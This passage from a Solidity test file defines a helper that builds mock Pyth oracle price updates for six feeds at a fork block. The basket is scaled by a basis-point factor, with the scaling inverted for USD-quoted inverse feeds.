    /// @dev Signed-update stand-in for a live tick at `tick`: the real stored price of each feed at FORK_BLOCK with the
    ///      basket scaled by `basketBps`/10_000: USD-quoted feeds x f, inverted (USD/xxx) feeds x 1/f.
    function _payload(uint64 tick, uint256 basketBps) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            int64 price = p.price;
            if (basketBps != BASE) {
                price = inverted[i]
                    ? int64(int256(price) * int256(BASE) / int256(basketBps))
                    : int64(int256(price) * int256(basketBps) / int256(BASE));
            }
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: price, conf: p.conf, expo: p.expo, publishTime: tick, prevPublishTime: tick - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```
